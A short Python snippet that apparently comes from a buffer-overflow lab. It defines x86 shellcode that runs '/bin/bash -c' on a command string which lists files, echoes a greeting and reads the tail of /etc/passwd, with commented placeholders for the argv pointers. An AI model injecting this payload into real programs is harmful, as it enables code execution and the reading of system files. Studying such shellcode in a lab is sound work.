shellcode = (
    "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
    "\x48\x8d\x4b\x0a\x89\x43\x0b\x48\x8d\x4b\x4c\x8d\x4b\x0d\x89\x4b"
    "\x50\x89\x43\x54\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff"
    "\xff\xff"
    "/bin/bash*"
    "-c*"
    "/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd"
    "AAAA"  # Placeholder for argv[0]  --> "/bin/bash"
    "BBBB"  # Placeholder for argv[1]  --> "-c"
    "CCCC"  # Placeholder for argv[2]  --> the command string
    "DDDD"  # Placeholder for argv[3]  --> NULL
).encode("latin-1")
